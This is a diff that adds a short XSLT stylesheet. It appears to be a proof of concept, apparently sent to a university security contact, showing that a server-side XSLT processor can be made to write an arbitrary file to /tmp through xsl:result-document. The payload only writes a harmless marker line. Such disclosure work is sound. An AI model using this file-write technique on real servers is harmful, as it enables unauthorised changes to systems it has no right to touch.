@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+        <xsl:result-document href="file:///tmp/9drlx9c0u7.txt" method="text">Proof of concept submitted to security@harvard.edu</xsl:result-document>
+    </xsl:template>
+</xsl:stylesheet>
